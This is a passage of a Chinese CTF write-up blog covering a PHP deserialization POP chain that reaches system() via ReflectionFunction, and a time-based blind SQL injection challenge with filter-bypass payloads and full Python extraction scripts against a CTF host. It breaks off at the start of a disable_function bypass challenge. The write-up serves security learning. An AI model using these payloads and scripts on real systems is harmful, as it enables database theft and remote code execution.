+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;secret.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Challenge</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">Sink</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Is there any file?&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">global</span> <span class="nv">$FLAG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$FLAG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Geek</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">)</span><span class="o">:</span> <span class="nx">void</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$change</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;change&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$FUNC</span><span class="o">=</span><span class="nv">$change</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$FUNC</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Syclover</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$IS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Girlfriend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__toString is called&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$eee</span><span class="o">=</span><span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Where</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">IS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$fff</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$eee</span><span class="o">-&gt;</span><span class="nv">$fff</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Girlfriend</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">       
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Geek</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Challenge</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">b</span><span class="o">=</span><span class="s2">&#34;Sink&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="k">new</span> <span class="nx">Syclover</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">Where</span><span class="o">=</span><span class="s1">&#39;ReflectionFunction&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">IS</span><span class="o">=</span><span class="s1">&#39;call_user_func&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">Starven</span><span class="o">=</span><span class="s1">&#39;invokeArgs&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">Girlfriend</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;file -f /flag&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">总结：此题还是学到很多，先是知道了可以利用数组进行对象的类的调用，还知道了</span><span class="n">implode与array_shift</span><span class="err">，</span><span class="n">file_exists可以触发toString魔术</span><span class="err">，最主要是学到了利用</span><span class="o">`</span><span class="n">ReflectionFunction</span><span class="o">`</span><span class="err">反射调用</span><span class="n">system来rce</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://ethe448.github.io/2022/02/25/%e4%bb%8e%e4%b8%80%e9%81%93ctf%e9%a2%98%e7%9c%8bphp%e5%8e%9f%e7%94%9f%e7%b1%bb/#toc-heading-12"  target="_blank" rel="noopener"
+    >从一道ctf题看php原生类 | Ethe&rsquo;s blog</a></p>
+<h2 id="funnysql">funnySQL
+</h2><h3 id="考点过滤sleepbenchmark与ormysqlinnodb_table_stats-查表与asciiordhex代替timetime精准测量延时">考点：过滤sleep（benchmark）与or（mysql.innodb_table_stats 查表）与ascii,ord(hex代替)+time.time()精准测量延时
+</h3><p>简单fuzz发现过滤了and，or，sleep，&ndash;+，空格。发现页面没啥回显，应该是时间盲注</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;/**/||/**/if(1&gt;0,benchmark(1000000,sha(1)),0)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>sleep过滤了还有其它方法，我用代码测试发现benchmark(10000000,sha(1))大概是11秒多</p>
+<p><a class="link" href="https://www.cnblogs.com/-qing-/p/10894310.html"  target="_blank" rel="noopener"
+    >MySQL时间盲注五种延时方法 (PWNHUB 非预期解) - 卿先生 - 博客园</a></p>
+<p>发现ascii，ord也过滤了，那就用hex，手动构造有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;||if((HEX(substr((SELECT/**/database()),1,1))&gt;HEX(CHAR(32))),benchmark(10000000,sha1(1)),0)#</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现有延时,那就直接打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">注意</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span><span class="n">由于or过滤了</span><span class="err">，</span><span class="n">意味着information和performance这俩库都查不了了</span><span class="err">，</span><span class="n">所以我们只能通过mysql</span><span class="o">.</span><span class="n">innodb_table_stats</span> <span class="n">来查到表名</span><span class="err">，</span><span class="n">然后这个没有列名</span><span class="err">，</span><span class="n">所以搜完表直接就可以搜了</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">写代码发送</span><span class="c1">#和 %23 的区别</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 是HTML中的片段标识符（不会发送到服务器）</span>
+</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="mi">23</span> <span class="n">是</span> <span class="c1"># 的URL编码形式（会作为数据发送到服务器）</span>
+</span></span><span class="line"><span class="cl"><span class="n">当使用</span> <span class="c1"># 时：</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="n">payload</span><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="n">浏览器会截断</span> <span class="c1"># 及之后的内容，服务器收到的实际请求是：</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">导致SQL语句不完整</span><span class="p">,</span><span class="n">用</span><span class="o">%</span><span class="mi">23</span><span class="n">就解决了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完整代码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://80-2bacb1b5-968c-413a-9c20-16a355e7b8af.challenge.ctfplus.cn/index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">tail</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 方法1：十六进制比较</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload= f&#34;?username=&#39;||if((HEX(substr((SELECT/**/database()),{i},1))/**/like/**/HEX(CHAR({j}))),benchmark(10000000,sha1(1)),0)%23&#34;    #syclover</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload= f&#34;?username=&#39;||if((HEX(substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#39;syclover&#39;),{i},1))/**/like/**/HEX(CHAR({j}))),benchmark(10000000,sha1(1)),0)%23&#34; #Rea11ys3ccccccr3333t</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;?username=&#39;||if((HEX(substr((select/**/*/**/from/**/Rea11ys3ccccccr3333t),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))/**/like/**/HEX(CHAR(</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">))),benchmark(10000000,sha1(1)),0)%23&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found char: </span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span><span class="si">}</span><span class="s2">, Current: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250723205053587.png" alt="image-20250723205053587" style="zoom:50%;" />
+<p>上面是根据wp的方法仿造的，但是太慢了，我用二分法写写试试（一开始用二分法没写出来）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://80-2bacb1b5-968c-413a-9c20-16a355e7b8af.challenge.ctfplus.cn/index.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;SELECT/**/database()&#39;    #查一下默认数据库</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#39;syclover&#39;#查表</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;select/**/*/**/from/**/Rea11ys3ccccccr3333t&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload_1</span><span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;?username=&#39;||if((HEX(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))/**/&gt;/**/HEX(CHAR(</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">))),benchmark(10000000,sha1(1)),0)%23&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">head</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">tail</span><span class="o">=</span><span class="n">mid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现二分法其实也很慢，感觉差不多啊。</p>
+<p>注意，这里所有的代码没有用try-except的延时判断方式，<strong>网络波动影响</strong>容易误判</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload_1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>而是用time.time()这种精准直接测量延迟，这样越加准确</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">head</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">tail</span><span class="o">=</span><span class="n">mid</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写完后看看wp的黑名单，看起来很简单，但是做起来却难了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/and|or| |\n|--|sleep|=|ascii/i&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl"><span class="k">die</span><span class="p">(</span><span class="s1">&#39;不准用！&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="not_just_pop">not_just_pop
+</h2><h3 id="考点蚁剑插件绕过disable_function">考点：蚁剑插件绕过disable_function
+</h3><p>拿到题目如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">lhRaMK7</span><span class="p">{</span>
